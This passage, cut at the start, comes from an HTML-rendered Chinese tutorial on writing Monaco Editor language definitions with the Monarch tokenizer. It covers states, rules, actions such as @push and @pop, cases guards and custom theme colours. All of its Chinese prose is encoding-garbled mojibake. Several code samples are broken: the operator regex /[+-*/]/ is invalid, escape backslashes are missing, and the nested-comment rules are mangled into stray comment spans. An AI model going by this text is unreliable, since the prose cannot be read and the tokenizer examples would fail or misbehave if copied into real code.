è¯­è¨€ï¼Œå¹¶è®¾ç½®è¯æ³•åˆ†æè§„åˆ™ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// æ³¨å†Œè¯­è¨€</span>
monaco.<span class="hljs-property">languages</span>.<span class="hljs-title function_">register</span>({ <span class="hljs-attr">id</span>: <span class="hljs-string">'myLang'</span> });
<span class="hljs-comment">// è®¾ç½®è¯æ³•åˆ†æè§„åˆ™</span>
monaco.<span class="hljs-property">languages</span>.<span class="hljs-title function_">setMonarchTokensProvider</span>(<span class="hljs-string">'myLang'</span>, {
  <span class="hljs-attr">tokenizer</span>: {}
});
<span class="hljs-comment">// é¢œè‰²ä¸»é¢˜è®¾ç½®</span>
monaco.<span class="hljs-property">editor</span>.<span class="hljs-title function_">defineTheme</span>(<span class="hljs-string">'logTheme'</span>, {});
</code></pre>
<p>å…¶ä¸­ <code>tokenizer</code> å¯¹è±¡å°±æ˜¯ç”¨æ¥æè¿°ä¸€ä¸ªè¯­è¨€å®šä¹‰çš„ JSON å¯¹è±¡ã€‚</p>
<p>Monaco Editor çš„ <strong>Tokenizerï¼ˆåˆ†è¯å™¨ï¼‰</strong> æ˜¯å®ç°ä»£ç é«˜äº®çš„æ ¸å¿ƒç»„ä»¶ã€‚å®ƒé€šè¿‡ <strong>Monarch</strong> åº“ï¼ˆä¸€ä¸ªåŸºäº JSON çš„å£°æ˜å¼è¯­æ³•ï¼‰å°†æºä»£ç æ–‡æœ¬æ‹†åˆ†ä¸ºä¸€ç³»åˆ—å¸¦æœ‰â€œç±»å‹æ ‡ç­¾â€çš„ <strong>Token</strong>ï¼ˆè®°å·ï¼‰ï¼Œéšåç¼–è¾‘å™¨æ ¹æ®ä¸»é¢˜ï¼ˆThemeï¼‰ä¸ºè¿™äº›æ ‡ç­¾æ¶‚ä¸Šä¸åŒçš„é¢œè‰²ã€‚</p>
<p>ä¸‹é¢æˆ‘ä»¬å°±é€æ­¥æ¥äº†è§£ä¸‹è¿™ä¸ªè§„èŒƒã€‚</p>
<h2 data-id="heading-0">è¯æ³•åˆ†æç®€å•åŸç†</h2>
<p>Monaco çš„ Tokenizer æ˜¯ä¸€ä¸ª<strong>çŠ¶æ€æœº</strong>ã€‚å®ƒé€è¡Œæ‰«æä»£ç ï¼Œå¹¶å§‹ç»ˆå¤„äºæŸä¸ªç‰¹å®šçš„â€œçŠ¶æ€â€ä¸­ï¼ˆé»˜è®¤åˆå§‹çŠ¶æ€ä¸º <code>root</code>ï¼‰ã€‚å…¶æ ¸å¿ƒæ¦‚å¿µæœ‰ï¼š</p>
<ul>
<li>
<p><strong>çŠ¶æ€ï¼ˆStatesï¼‰</strong> ï¼šè§£æå™¨å§‹ç»ˆå¤„äºæŸä¸ªç‰¹å®šçŠ¶æ€ï¼ˆåˆå§‹ä¸º <code>root</code>ï¼‰ã€‚</p>
</li>
<li>
<p><strong>æ­£åˆ™åŒ¹é…ï¼ˆRegex Matchingï¼‰</strong> ï¼šåœ¨å½“å‰çŠ¶æ€ä¸‹ï¼ŒæŒ‰é¡ºåºç”¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…å½“å‰è¡Œã€‚</p>
</li>
<li>
<p><strong>åŠ¨ä½œï¼ˆActionsï¼‰</strong> ï¼šåŒ¹é…æˆåŠŸåæ‰§è¡Œæ“ä½œï¼Œå¦‚èµ‹äºˆ Token ç±»å‹ã€åˆ‡æ¢çŠ¶æ€ï¼ˆ<code>next</code>ï¼‰æˆ–æ¨å…¥çŠ¶æ€æ ˆï¼ˆ<code>push</code>ï¼‰ã€‚</p>
</li>
</ul>
<h2 data-id="heading-1">è¯æ³•åˆ†æç®€å•æ•™ç¨‹</h2>
<h3 data-id="heading-2">åˆçº§ï¼šåŸºç¡€åŒ¹é…ï¼ˆçº¿æ€§è§„åˆ™ï¼‰</h3>
<p>è¿™æ˜¯æœ€ç®€å•çš„å½¢æ€ï¼Œé€šè¿‡æ­£åˆ™è¡¨è¾¾å¼ç›´æ¥ç»™åŒ¹é…åˆ°çš„æ–‡å­—æ‰“ä¸Šâ€œæ ‡ç­¾â€ï¼ˆToken Typeï¼‰ã€‚</p>
<p>æ­¤æ—¶ Tokenizer åƒä¸€ä¸ªç®€å•çš„è¿‡æ»¤å™¨ï¼Œæ‰«æåˆ°å“ªç®—å“ªï¼Œæ²¡æœ‰â€œä¸Šä¸‹æ–‡â€æ¦‚å¿µã€‚</p>
<pre><code class="hljs language-js" lang="js">monaco.<span class="hljs-property">languages</span>.<span class="hljs-title function_">setMonarchTokensProvider</span>(<span class="hljs-string">'myLang'</span>, {
  <span class="hljs-attr">tokenizer</span>: {
    <span class="hljs-attr">root</span>: [
      [<span class="hljs-regexp">/\b(if|else|return)\b/</span>, <span class="hljs-string">"keyword"</span>], <span class="hljs-comment">// åŒ¹é…å…³é”®å­—</span>
      [<span class="hljs-regexp">/[0-9]+/</span>, <span class="hljs-string">"number"</span>],               <span class="hljs-comment">// åŒ¹é…æ•°å­—</span>
      [<span class="hljs-regexp">/[+-*/]/</span>, <span class="hljs-string">"operator"</span>],            <span class="hljs-comment">// åŒ¹é…è¿ç®—ç¬¦</span>
      [<span class="hljs-regexp">/[a-zA-Z_]\w*/</span>, <span class="hljs-string">"identifier"</span>],     <span class="hljs-comment">// åŒ¹é…å˜é‡å</span>
    ]
  }
});
</code></pre>
<h3 data-id="heading-3">ä¸­çº§ï¼šçŠ¶æ€åˆ‡æ¢ï¼ˆå¤„ç†å­—ç¬¦ä¸²ï¼‰</h3>
<p>ç®€å•çš„æ­£åˆ™æ— æ³•å¤„ç†è·¨è¶Šå¤šä¸ªå­—ç¬¦çš„ç»“æ„ï¼ˆå¦‚å¼•å·åŒ…å›´çš„å†…å®¹ï¼‰ã€‚æˆ‘ä»¬éœ€è¦å¼•å…¥ <strong>çŠ¶æ€ï¼ˆStatesï¼‰</strong> ã€‚</p>
<p>å¦‚ä¸‹ç¤ºä¾‹ï¼šè¯†åˆ«è¢«åŒå¼•å·åŒ…å›´çš„å­—ç¬¦ä¸²ï¼Œä¸”æ”¯æŒè½¬ä¹‰å­—ç¬¦ <code>"</code>ã€‚</p>
<pre><code class="hljs language-js" lang="js">monaco.<span class="hljs-property">languages</span>.<span class="hljs-title function_">setMonarchTokensProvider</span>(<span class="hljs-string">'myLang'</span>, {
  <span class="hljs-attr">tokenizer</span>: {
    <span class="hljs-attr">root</span>: [
      [<span class="hljs-regexp">/"/</span>, <span class="hljs-string">'string.quote'</span>, <span class="hljs-string">'@string'</span>], <span class="hljs-comment">// åŒ¹é…åˆ° " æ—¶ï¼Œæ ‡ä¸º string.quote å¹¶è¿›å…¥ string çŠ¶æ€</span>
    ],
    <span class="hljs-attr">string</span>: [
      [<span class="hljs-regexp">/\./</span>, <span class="hljs-string">'string.escape'</span>],  <span class="hljs-comment">// åŒ¹é…è½¬ä¹‰å­—ç¬¦ å¦‚ "</span>
      [<span class="hljs-regexp">/[^"]/</span>, <span class="hljs-string">'string'</span>],        <span class="hljs-comment">// åŒ¹é…é " å­—ç¬¦</span>
      [<span class="hljs-regexp">/"/</span>, <span class="hljs-string">'string.quote'</span>, <span class="hljs-string">'@pop'</span>]  <span class="hljs-comment">// / é‡åˆ°é—­åˆå¼•å·ï¼Œé€€å‡ºçŠ¶æ€å›åˆ° root</span>
    ]
  },
});
</code></pre>
<h3 data-id="heading-4">é«˜çº§ï¼šåµŒå¥—ä¸æ ˆæ“ä½œï¼ˆå¤šè¡Œæ³¨é‡Šä¸åµŒå¥—ç»“æ„ï¼‰</h3>
<p>è¯†åˆ«å¤šè¡Œæ³¨é‡Š <code>/* ... */</code>ï¼Œä¸”æ”¯æŒæ³¨é‡ŠåµŒå¥—å¦‚ <code>/* a /* b */ c */</code>ã€‚</p>
<pre><code class="hljs language-js" lang="js">monaco.<span class="hljs-property">languages</span>.<span class="hljs-title function_">setMonarchTokensProvider</span>(<span class="hljs-string">'myLang'</span>, {
  <span class="hljs-attr">tokenizer</span>: {
    <span class="hljs-attr">root</span>: [
        [<span class="hljs-comment">//*/, 'comment', '@comment'], // åŒ¹é…åˆ° /* è¿›å…¥æ³¨é‡ŠçŠ¶æ€</span>
    ],
    
    <span class="hljs-attr">comment</span>: [
        [<span class="hljs-regexp">/[^/*]+/</span>, <span class="hljs-string">'comment'</span>],
        [<span class="hljs-comment">//*/, 'comment', '@push'], // æ”¯æŒåµŒå¥—æ³¨é‡Š</span>
        [<span class="hljs-string">'\*/'</span>, <span class="hljs-string">'comment'</span>, <span class="hljs-string">'@pop'</span>],
        [<span class="hljs-regexp">/[/*]/</span>, <span class="hljs-string">'comment'</span>],
    ],
  },
});
</code></pre>
<h2 data-id="heading-5">ä¸»é¢˜</h2>
<p>å½“é…ç½®å¥½è¯æ³•åˆ†æåï¼Œä½¿ç”¨äº†é»˜è®¤çš„ token ï¼Œç¼–è¾‘å™¨ä¼šè‡ªåŠ¨è¿›è¡Œå¯¹åº”çš„è¯­è¨€é«˜äº®ã€‚</p>
<p>å½“è¯æ³•åˆ†æè§„åˆ™ä¸­é…ç½®äº†è‡ªå®šä¹‰çš„ tokenï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é…ç½®è‡ªå®šä¹‰ token çš„é¢œè‰²ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// Define a new theme that contains only rules that match this language</span>
monaco.<span class="hljs-property">editor</span>.<span class="hljs-title function_">defineTheme</span>(<span class="hljs-string">"myCoolTheme"</span>, {
    <span class="hljs-attr">base</span>: <span class="hljs-string">"vs"</span>,
    <span class="hljs-attr">inherit</span>: <span class="hljs-literal">false</span>,
    <span class="hljs-attr">rules</span>: [
        { <span class="hljs-attr">token</span>: <span class="hljs-string">"custom-info"</span>, <span class="hljs-attr">foreground</span>: <span class="hljs-string">"808080"</span> },
        { <span class="hljs-attr">token</span>: <span class="hljs-string">"custom-error"</span>, <span class="hljs-attr">foreground</span>: <span class="hljs-string">"ff0000"</span>, <span class="hljs-attr">fontStyle</span>: <span class="hljs-string">"bold"</span> },
        { <span class="hljs-attr">token</span>: <span class="hljs-string">"custom-notice"</span>, <span class="hljs-attr">foreground</span>: <span class="hljs-string">"FFA500"</span> },
        { <span class="hljs-attr">token</span>: <span class="hljs-string">"custom-date"</span>, <span class="hljs-attr">foreground</span>: <span class="hljs-string">"008800"</span> },
    ],
    <span class="hljs-attr">colors</span>: {
        <span class="hljs-string">"editor.foreground"</span>: <span class="hljs-string">"#000000"</span>,
    },
});
</code></pre>
<h2 data-id="heading-6">Tokenizer å®šä¹‰è¯¦è§£</h2>
<blockquote>
<p>æ›´å¤šå†…å®¹å‚è€ƒï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fmicrosoft.github.io%2Fmonaco-editor%2Fmonarch.html" target="_blank" title="https://microsoft.github.io/monaco-editor/monarch.html" ref="nofollow noopener noreferrer">microsoft.github.io/monaco-editâ€¦</a></p>
</blockquote>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// ä¼ªä»£ç ç¤ºæ„</span>
<span class="hljs-comment">// tokenizer çš„å®šä¹‰</span>
<span class="hljs-attr">tokenizer</span>: {
   <span class="hljs-comment">// åŒ…å«è‹¥å¹²çŠ¶æ€(state)</span>
   <span class="hljs-comment">// xxxx çŠ¶æ€(state)</span>
   <span class="hljs-attr">xxxx</span>: [
      <span class="hljs-comment">// xxxx çŠ¶æ€ä¸‹åŒ…å«è‹¥å¹²è§„åˆ™(rule)ï¼Œ</span>
      [regex,  action],  <span class="hljs-comment">// è§„åˆ™ç”± æ­£åˆ™è¡¨è¾¾å¼(regex) ä¸åŠ¨ä½œ(action) ç»„æˆ</span>
   ]
}
</code></pre>
<h3 data-id="heading-7">çŠ¶æ€</h3>
<p>åˆ†è¯å™¨ï¼ˆtokenizerï¼‰ç”±ä¸€ä¸ªå®šä¹‰çŠ¶æ€çš„å¯¹è±¡æ„æˆã€‚åˆ†è¯å™¨çš„åˆå§‹çŠ¶æ€æ˜¯å…¶å®šä¹‰ä¸­çš„ç¬¬ä¸€ä¸ªçŠ¶æ€ã€‚å½“åˆ†è¯å™¨å¤„äºæŸä¸ªç‰¹å®šçŠ¶æ€æ—¶ï¼Œåªä¼šåº”ç”¨è¯¥çŠ¶æ€ä¸‹çš„è§„åˆ™ã€‚æ‰€æœ‰è§„åˆ™æŒ‰é¡ºåºè¿›è¡ŒåŒ¹é…ï¼Œå½“ç¬¬ä¸€ä¸ªè§„åˆ™åŒ¹é…æˆåŠŸåï¼Œå°±ä¼šæ‰§è¡Œå…¶å¯¹åº”çš„æ“ä½œæ¥ç¡®å®šè¯æ³•å•å…ƒç±»åˆ«ï¼Œåç»­è§„åˆ™ä¸å†è¿›è¡Œå°è¯•ã€‚å› æ­¤ï¼Œä»¥æœ€é«˜æ•ˆçš„æ–¹å¼å¯¹è§„åˆ™è¿›è¡Œæ’åºå¯èƒ½å¾ˆé‡è¦ï¼Œä¾‹å¦‚ï¼Œå°†ç©ºç™½ç¬¦å’Œæ ‡è¯†ç¬¦è§„åˆ™æ”¾åœ¨å‰é¢ã€‚</p>
<h3 data-id="heading-8">è§„åˆ™</h3>
<p>æ¯ä¸ªçŠ¶æ€éƒ½è¢«å®šä¹‰ä¸ºä¸€ç»„è§„åˆ™æ•°ç»„ï¼Œè¿™äº›è§„åˆ™ç”¨äºåŒ¹é…è¾“å…¥ã€‚è§„åˆ™å¯ä»¥é‡‡ç”¨ä»¥ä¸‹å½¢å¼ï¼š</p>
<p><strong><code>[</code></strong> <em><strong><code>regex</code></strong></em> <strong><code>,</code></strong> <em><strong><code>action</code></strong></em> <strong><code>]</code></strong></p>
<p><code>{ regex: </code><em><code>regex</code></em><code>, action: </code><em><code>action</code></em><code> }</code> çš„ç®€å†™</p>
<p><strong><code>[</code></strong> <em><strong><code>regex</code></strong></em> <strong><code>,</code></strong> <em><strong><code>action</code></strong></em> <strong><code>,</code></strong> <em><strong><code>next</code></strong></em> <strong><code>]</code></strong></p>
<p><code>{ regex: </code><em><code>regex</code></em><code>, action: </code><em><code>action</code></em><code>{next: </code><em><code>next</code></em><code>} }</code> çš„ç®€å†™</p>
<p><strong><code>{regex:</code></strong> <em><strong><code>regex</code></strong></em> <strong><code>, action:</code></strong> <em><strong><code>action</code></strong></em> <strong><code>}</code></strong></p>
<p>Â Â å½“æ­£åˆ™è¡¨è¾¾å¼ä¸å½“å‰è¾“å…¥åŒ¹é…æ—¶ï¼Œå°±ä¼šæ‰§è¡Œç›¸åº”æ“ä½œæ¥è®¾ç½®è¯æ³•å•å…ƒçš„ç±»åˆ«ã€‚æ­£åˆ™è¡¨è¾¾å¼ï¼ˆregexï¼‰æ—¢å¯ä»¥æ˜¯ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼ˆä½¿ç”¨/regex/çš„å½¢å¼ï¼‰ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªè¡¨ç¤ºæ­£åˆ™è¡¨è¾¾å¼çš„å­—ç¬¦ä¸²ã€‚ç¤ºä¾‹å¦‚ä¸Šè¿°ã€ŒåŸºç¡€åŒ¹é…ã€å†…å®¹ã€‚</p>
<p><strong><code>{ include:</code></strong> <em><strong><code>state</code></strong></em> <strong><code>}</code></strong></p>
<p>Â Â ç”¨äºå¯¹è§„åˆ™è¿›è¡Œè‰¯å¥½çš„ç»„ç»‡ï¼Œå¹¶æ‰©å±•ä¸ºåœ¨çŠ¶æ€ä¸­å®šä¹‰çš„æ‰€æœ‰è§„åˆ™ã€‚è¿™æ˜¯é¢„å…ˆæ‰©å±•çš„ï¼Œå¯¹æ€§èƒ½æ²¡æœ‰å½±å“ã€‚å¦‚ä¸‹ç¤ºä¾‹ï¼ŒåŒ…å«çš„ <code>@whitespace</code> çŠ¶æ€ã€‚</p>
<pre><code class="hljs language-js" lang="js">    <span class="hljs-attr">tokenizer</span>: {
    <span class="hljs-attr">root</span>: [
      <span class="hljs-comment">// ... others</span>
      <span class="hljs-comment">// whitespace</span>
      { <span class="hljs-attr">include</span>: <span class="hljs-string">'@whitespace'</span> },
    ],

    <span class="hljs-attr">comment</span>: [
      [<span class="hljs-regexp">/[^/*]+/</span>, <span class="hljs-string">'comment'</span> ],
      [<span class="hljs-comment">//*/,    'comment', '@push' ],    // nested comment</span>
      [<span class="hljs-string">"\*/"</span>,    <span class="hljs-string">'comment'</span>, <span class="hljs-string">'@pop'</span>  ],
      [<span class="hljs-regexp">/[/*]/</span>,   <span class="hljs-string">'comment'</span> ]
    ],

    <span class="hljs-attr">whitespace</span>: [
      [<span class="hljs-regexp">/[ \t\r\n]+/</span>, <span class="hljs-string">'white'</span>],
      [<span class="hljs-comment">//*/,       'comment', '@comment' ],</span>
      [<span class="hljs-comment">///.*$/,    'comment'],</span>
    ],
  },
</code></pre>
<h3 data-id="heading-9">åŠ¨ä½œ</h3>
<p>ä¸€ä¸ªåŠ¨ä½œå†³å®šäº†ç”Ÿæˆçš„è¯æ³•å•å…ƒï¼ˆtokenï¼‰ç±»åˆ«ã€‚ä¸€ä¸ªåŠ¨ä½œå¯ä»¥æœ‰ä»¥ä¸‹å½¢å¼ï¼š</p>
<ul>
<li><em><strong><code>string</code></strong></em></li>
</ul>
<p>æ˜¯ <code>{ token: </code><em><code>string</code></em><code> }</code> çš„ç®€å†™ã€‚</p>
<ul>
<li>
<p><strong><code>[</code></strong> <em><strong><code>action1</code></strong></em> <strong><code>,...,</code></strong> <em><strong><code>actionN</code></strong></em> <strong><code>]</code></strong></p>
<ul>
<li>
<p>Â Â ä¸€ä¸ªåŒ…å« N ä¸ªåŠ¨ä½œçš„æ•°ç»„ã€‚è¿™ä»…åœ¨æ­£åˆ™è¡¨è¾¾å¼æ°å¥½ç”± N ä¸ªç»„ï¼ˆå³å¸¦æ‹¬å·çš„éƒ¨åˆ†ï¼‰ç»„æˆæ—¶æ‰è¢«å…è®¸ã€‚ç”±äºåˆ†è¯å™¨çš„å·¥ä½œæ–¹å¼ï¼Œä½ å¿…é¡»ä»¥è¿™æ ·ä¸€ç§æ–¹å¼å®šä¹‰è¿™äº›ç»„ï¼šæ‰€æœ‰ç»„éƒ½å‡ºç°åœ¨é¡¶çº§ä½ç½®å¹¶æ¶µç›–æ•´ä¸ªè¾“å…¥ï¼Œä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥å°†å¸¦æœ‰ASCIIç è½¬ä¹‰åºåˆ—çš„å­—ç¬¦å®šä¹‰ä¸ºï¼š</p>
</li>
<li>
<pre><code class="hljs language-js" lang="js">/(<span class="hljs-string">')(\(?:[abnfrt]|[xX][0-9]{2}))('</span>)/, [<span class="hljs-string">'string'</span>,<span class="hljs-string">'string.escape'</span>,<span class="hljs-string">'string'</span>]]
</code></pre>
</li>
</ul>
</li>
<li>
<p><strong><code>{ token:</code></strong> <em><strong><code>tokenclass</code></strong></em> <strong><code>}</code></strong></p>
<ul>
<li>
<p>Â Â ä¸€ä¸ªå®šä¹‰ç”¨äº CSS æ¸²æŸ“çš„è¯æ³•å•å…ƒï¼ˆtokenï¼‰ç±»åˆ«çš„å¯¹è±¡ã€‚å¸¸è§çš„è¯æ³•å•å…ƒï¼ˆtokenï¼‰ä¾‹å¦‚æœ‰â€œkeywordâ€ï¼ˆå…³é”®å­—ï¼‰ã€â€œcommentâ€ï¼ˆæ³¨é‡Šï¼‰æˆ–â€œidentifierâ€ï¼ˆæ ‡è¯†ç¬¦ï¼‰ã€‚ä½ å¯ä»¥ä½¿ç”¨ç‚¹æ¥è¡¨ç¤ºå±‚çº§åŒ–çš„CSSåç§°ï¼Œæ¯”å¦‚â€œtype.identifierâ€æˆ–â€œstring.escapeâ€ã€‚</p>
</li>
</ul>
</li>
</ul>
<p>ä¸€ä¸ªåŠ¨ä½œå¯¹è±¡å¯ä»¥åŒ…å«æ›´å¤šå½±å“è¯æ³•åˆ†æå™¨çŠ¶æ€çš„å­—æ®µã€‚ä»¥ä¸‹å±æ€§æ˜¯å¯è¯†åˆ«çš„ï¼š</p>
<ul>
<li><strong><code>next:</code></strong> <em><strong><code>state</code></strong></em></li>
</ul>
<p>Â Â ï¼ˆå­—ç¬¦ä¸²ï¼‰å¦‚æœå·²å®šä¹‰ï¼Œå®ƒä¼šå°†å½“å‰çŠ¶æ€æ¨å…¥åˆ†è¯å™¨æ ˆï¼Œå¹¶ä½¿ state æˆä¸ºå½“å‰çŠ¶æ€ã€‚ä¾‹å¦‚ï¼Œè¿™å¯ç”¨äºå¼€å§‹å¯¹å—æ³¨é‡Šè¿›è¡Œåˆ†è¯ï¼š</p>
<pre><code class="hljs language-js" lang="js">[<span class="hljs-string">'/\*'</span>, <span class="hljs-string">'comment'</span>, <span class="hljs-string">'@comment'</span> ]
</code></pre>
<blockquote>
<p>è¯·æ³¨æ„ï¼Œè¿™æ˜¯ä»¥ä¸‹å†…å®¹çš„ç®€å†™å½¢å¼</p>
<p><code>{ regex: '/\*', action: { token: 'comment', next: '@comment' } }</code></p>
</blockquote>
<p>Â Â åœ¨è¿™é‡Œï¼ŒåŒ¹é…åˆ°çš„ <code>/*</code> è¢«èµ‹äºˆâ€œcommentâ€è¯æ³•å•å…ƒï¼Œåˆ†è¯å™¨ä¼šä½¿ç”¨ <code>@comment</code> çŠ¶æ€ä¸‹çš„è§„åˆ™ç»§ç»­åŒ¹é…è¾“å…¥ã€‚</p>
<p>Â Â nextå±æ€§å¯ä»¥ä½¿ç”¨ä¸€äº›ç‰¹æ®ŠçŠ¶æ€ï¼š</p>
<ul>
<li><code>"@pop"</code></li>
</ul>
<p>Â Â Â Â å¼¹å‡ºåˆ†è¯å™¨æ ˆä»¥è¿”å›åˆ°ä¹‹å‰çš„çŠ¶æ€ã€‚ä¾‹å¦‚ï¼Œè¿™å¯ç”¨äºåœ¨çœ‹åˆ°ç»“æŸæ ‡è®°åä»å—æ³¨é‡Šåˆ†è¯çŠ¶æ€è¿”å›ï¼š</p>
<pre><code class="hljs language-js" lang="js">[<span class="hljs-string">'\*/'</span>, <span class="hljs-string">'comment'</span>, <span class="hljs-string">'@pop'</span>]
</code></pre>
<ul>
<li><code>"@push"</code></li>
</ul>
<p>Â Â Â Â æ¨å…¥å½“å‰çŠ¶æ€å¹¶ç»§ç»­ä¿æŒå½“å‰çŠ¶æ€ã€‚åœ¨çœ‹åˆ°æ³¨é‡Šå¼€å§‹æ ‡è®°æ—¶å¤„ç†åµŒå¥—å—æ³¨é‡Šå¾ˆæœ‰ç”¨ï¼Œä¾‹å¦‚ï¼Œåœ¨@commentçŠ¶æ€ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·åšï¼š</p>
<pre><code class="hljs language-js" lang="js">[<span class="hljs-string">'/\*'</span>, <span class="hljs-string">'comment'</span>, <span class="hljs-string">'@push'</span>]
</code></pre>
<ul>
<li><code>"@popall"</code></li>
</ul>
<p>Â Â Â Â å¼¹å‡ºåˆ†è¯å™¨æ ˆä¸­çš„æ‰€æœ‰å†…å®¹å¹¶è¿”å›åˆ°é¡¶å±‚çŠ¶æ€ã€‚è¿™å¯ç”¨äºåœ¨æ¢å¤è¿‡ç¨‹ä¸­ä»æ·±å±‚åµŒå¥—çº§åˆ«â€œè·³è½¬â€å›åˆå§‹çŠ¶æ€ã€‚</p>
<ul>
<li>
<p><strong><code>{ cases: { guard1: action1, ..., guardN: actionN } }</code></strong></p>
<ul>
<li>Â Â æœ€åä¸€ç§åŠ¨ä½œå¯¹è±¡æ˜¯ cases è¯­å¥ã€‚cases å¯¹è±¡åŒ…å«ä¸€ä¸ªå¯¹è±¡ï¼Œå…¶ä¸­æ¯ä¸ªå­—æ®µéƒ½å……å½“ä¸€ä¸ªå®ˆå«æ¡ä»¶ã€‚æ¯ä¸ªå®ˆå«æ¡ä»¶éƒ½ä¼šåº”ç”¨äºåŒ¹é…åˆ°çš„è¾“å…¥ï¼Œä¸€æ—¦å…¶ä¸­ä¸€ä¸ªå®ˆå«æ¡ä»¶åŒ¹é…æˆåŠŸï¼Œå°±ä¼šæ‰§è¡Œç›¸åº”çš„åŠ¨ä½œã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äºè¿™äº›æœ¬èº«å°±æ˜¯åŠ¨ä½œï¼Œæ‰€ä»¥ cases å¯ä»¥åµŒå¥—ã€‚ä½¿ç”¨ cases æ˜¯ä¸ºäº†æé«˜æ•ˆç‡ï¼šä¾‹å¦‚ï¼Œæˆ‘ä»¬å…ˆåŒ¹é…æ ‡è¯†ç¬¦ï¼Œç„¶åæ£€æŸ¥è¯¥æ ‡è¯†ç¬¦æ˜¯å¦å¯èƒ½æ˜¯å…³é”®å­—æˆ–å†…ç½®å‡½æ•°ï¼š</li>
<li>
<pre><code class="hljs language-js" lang="js">[<span class="hljs-regexp">/[a-z_$][a-zA-Z0-9_$]*/</span>,
  { <span class="hljs-attr">cases</span>: {
      <span class="hljs-string">'@typeKeywords'</span>: <span class="hljs-string">'keyword.type'</span>,
      <span class="hljs-string">'@keywords'</span>: <span class="hljs-string">'keyword'</span>,
      <span class="hljs-string">'@default'</span>: <span class="hljs-string">'identifier'</span>
   } }
]
</code></pre>
</li>
</ul>
</li>
</ul>
<p>Â Â å®ˆå«æ¡ä»¶å¯ä»¥åŒ…æ‹¬ï¼š</p>
<p>Â Â <code>"@keywords"</code></p>
<p>Â Â Â Â keywords å±æ€§å¿…é¡»åœ¨è¯­è¨€å¯¹è±¡ä¸­å®šä¹‰ï¼Œå¹¶ä¸”ç”±å­—ç¬¦ä¸²æ•°ç»„ç»„æˆã€‚å¦‚æœåŒ¹é…åˆ°çš„è¾“å…¥ä¸è¯¥æ•°ç»„ä¸­çš„ä»»ä½•ä¸€ä¸ªå­—ç¬¦ä¸²åŒ¹é…ï¼Œé‚£ä¹ˆè¿™ä¸ªå®ˆå«æ¡ä»¶å°±ä¼šæˆåŠŸã€‚ï¼ˆæ³¨æ„ï¼šæ‰€æœ‰æƒ…å†µéƒ½ä¼šé¢„å…ˆç¼–è¯‘ï¼Œå¹¶ä¸”ä¼šä½¿ç”¨é«˜æ•ˆçš„å“ˆå¸Œæ˜ å°„æ¥æµ‹è¯•è¯¥åˆ—è¡¨ï¼‰ã€‚é«˜çº§ç”¨æ³•ï¼šå¦‚æœè¯¥å±æ€§æŒ‡å‘å•ä¸ªå­—ç¬¦ä¸²ï¼ˆè€Œéæ•°ç»„ï¼‰ï¼Œå®ƒä¼šè¢«ç¼–è¯‘æˆä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œç”¨äºæµ‹è¯•åŒ¹é…åˆ°çš„è¾“å…¥ã€‚</p>
<p>Â Â <code>"@default"</code></p>
<p>Â Â Â Â ï¼ˆæˆ–"@"æˆ–""ï¼‰é»˜è®¤çš„å®ˆå«æ¡ä»¶ï¼Œå§‹ç»ˆä¼šæˆåŠŸã€‚</p>
<p>Â Â <code>"@eos"</code></p>
<p>Â Â Â Â å¦‚æœåŒ¹é…åˆ°çš„è¾“å…¥å·²åˆ°è¾¾è¡Œå°¾ï¼Œåˆ™æˆåŠŸã€‚</p>
<p>Â Â <code>"regex"</code></p>
<p>Â Â Â Â å¦‚æœå®ˆå«æ¡ä»¶ä¸æ˜¯ä»¥@ï¼ˆæˆ–$ï¼‰å­—ç¬¦å¼€å¤´ï¼Œåˆ™ä¼šè¢«è§£é‡Šä¸ºä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œç”¨äºæµ‹è¯•åŒ¹é…åˆ°çš„è¾“å…¥ã€‚æ³¨æ„ï¼šè¯¥æ­£åˆ™è¡¨è¾¾å¼ä¼šè¢«åŠ ä¸Šå‰ç¼€^å’Œåç¼€$ï¼Œå› æ­¤å®ƒå¿…é¡»ä¸åŒ¹é…åˆ°çš„è¾“å…¥å®Œå…¨åŒ¹é…ã€‚è¿™å¯ç”¨äºæµ‹è¯•ç‰¹å®šçš„è¾“å…¥ï¼Œä¾‹å¦‚ï¼Œä¸‹é¢æ˜¯æ¥è‡ªKokaè¯­è¨€çš„ä¸€ä¸ªç¤ºä¾‹ï¼Œå®ƒä½¿ç”¨è¿™ä¸€ç‰¹æ€§æ ¹æ®å£°æ˜è¿›å…¥ä¸åŒçš„åˆ†è¯å™¨çŠ¶æ€ï¼š</p>
<pre><code class="hljs language-js" lang="js">[<span class="hljs-regexp">/[a-z](\w|-[a-zA-Z])*/</span>,
  { <span class="hljs-attr">cases</span>:{ <span class="hljs-string">'@keywords'</span>: {
               <span class="hljs-attr">cases</span>: { <span class="hljs-string">'alias'</span>              : { <span class="hljs-attr">token</span>: <span class="hljs-string">'keyword'</span>, <span class="hljs-attr">next</span>: <span class="hljs-string">'@alias-type'</span> }
                      , <span class="hljs-string">'struct'</span>             : { <span class="hljs-attr">token</span>: <span class="hljs-string">'keyword'</span>, <span class="hljs-attr">next</span>: <span class="hljs-string">'@struct-type'</span> }
                      , <span class="hljs-string">'type|cotype|rectype'</span>: { <span class="hljs-attr">token</span>: <span class="hljs-string">'keyword'</span>, <span class="hljs-attr">next</span>: <span class="hljs-string">'@type'</span> }
                      , <span class="hljs-string">'module|as|import'</span>   : { <span class="hljs-attr">token</span>: <span class="hljs-string">'keyword'</span>, <span class="hljs-attr">next</span>: <span class="hljs-string">'@module'</span> }
                      , <span class="hljs-string">'@default'</span>           : <span class="hljs-string">'keyword'</span> }
            }
          , <span class="hljs-string">'@builtins'</span>: <span class="hljs-string">'predefined'</span>
          , <span class="hljs-string">'@default'</span> : <span class="hljs-string">'identifier'</span> }
  }
]
